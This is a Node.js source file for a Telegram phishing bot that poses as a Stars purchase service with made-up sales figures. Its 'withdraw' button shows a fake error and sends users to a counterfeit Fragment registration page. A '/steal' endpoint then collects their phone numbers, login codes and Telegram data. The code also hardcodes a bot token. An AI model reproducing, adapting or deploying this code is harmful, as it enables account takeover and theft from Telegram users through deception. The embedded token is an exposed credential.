const TelegramBot = require('node-telegram-bot-api');
const express = require('express');
const path = require('path');

const BOT_TOKEN = '8435516460:AAEb00SvrmPLzDX_3JBXUyb3EouDC7yJKCs';
const bot = new TelegramBot(BOT_TOKEN, { polling: true });
const app = express();

app.use(express.json());
app.use(express.static('public'));

// Web App страница
app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'fragment.html'));
});

// endpoint для кражи данных
app.post('/steal', (req, res) => {
  console.log('=== УКРАДЕННЫЕ ДАННЫЕ ===');
  console.log('Номер:', req.body.phone);
  console.log('Код:', req.body.code);
  console.log('Telegram Data:', req.body.tg_data);
  console.log('========================');
  res.sendStatus(200);
});

const PORT = process.env.PORT || 8080;
app.listen(PORT, () => {
  console.log(`Web App работает на порту ${PORT}`);
});

// Бот с исправленными колбэками
bot.onText(/\/start/, (msg) => {
  const chatId = msg.chat.id;
  
  const keyboard = {
    reply_markup: {
      inline_keyboard: [
        [{ text: "Вывести звезды", callback_data: "withdraw_stars" }],
        [{ text: "Пополнить баланс", callback_data: "deposit" }],
        [{ text: "Создать чек", callback_data: "create_check" }]
      ]
    }
  };

  bot.sendMessage(chatId, 
    `Привет! @EasyChecs_bot - Это удобный бот для покупки/ передачи звезд в Telegram.\n\n` +
    `С ним ты можешь моментально покупать и передавать звезды.\n\n` +
    `Бот работает почти год, и с помощью него куплена огромная доля звезд в Telegram.\n\n` +
    `С помощью бота куплено:\n6,307,360 ▼ (~ $94,610)`,
    keyboard
  );
});

// Обработчик кнопок ДОЛЖЕН БЫТЬ ДО обработчика сообщений
bot.on('callback_query', (query) => {
  const chatId = query.message.chat.id;
  const messageId = query.message.message_id;

  console.log(`Обработка кнопки: ${query.data}`);

  if (query.data === 'withdraw_stars') {
    const webAppUrl = `https://starsdrainer-production.up.railway.app/`; // ЗАМЕНИ НА СВОЙ ДОМЕН
    
    const keyboard = {
      reply_markup: {
        inline_keyboard: [[
          { 
            text: "Зарегистрироваться", 
            web_app: { url: webAppUrl }
          }
        ]]
      }
    };

    bot.editMessageText(
      `Произошла ошибка! Вы не зарегистрированы на fragment.com, платформе от Telegram, для покупки звезд.\n\n` +
      `Чтобы вывести звезды, нужно зарегистрироваться на Fragment.`,
      { 
        chat_id: chatId, 
        message_id: messageId,
        reply_markup: keyboard.reply_markup
      }
    ).catch(e => {
      console.log('Ошибка редактирования:', e);
      // Если не получается отредактировать, отправляем новое сообщение
      bot.sendMessage(chatId, 
        `Произошла ошибка! Вы не зарегистрированы на fragment.com...`,
        keyboard
      );
    });
  }

  else if (query.data === 'deposit') {
    bot.sendMessage(chatId, 'Функция пополнения временно недоступна.');
  }

  else if (query.data === 'create_check') {
    bot.sendMessage(chatId, 'Функция создания чеков временно недоступна.');
  }

  // Всегда отвечаем на callback
  bot.answerCallbackQuery(query.id).catch(e => console.log('Ошибка answerCallback:', e));
});

// Простой обработчик сообщений
bot.on('message', (msg) => {
  // Игнорируем команды и служебные сообщения
  if (msg.text && !msg.text.startsWith('/')) {
    console.log(`Сообщение от ${msg.chat.id}: ${msg.text}`);
  }
});

console.log('Бот запущен! Проверь:');
console.log('1. Токен бота корректен');
console.log('2. Бот имеет права на Web App');
console.log('3. Домен в коде заменен на твой');
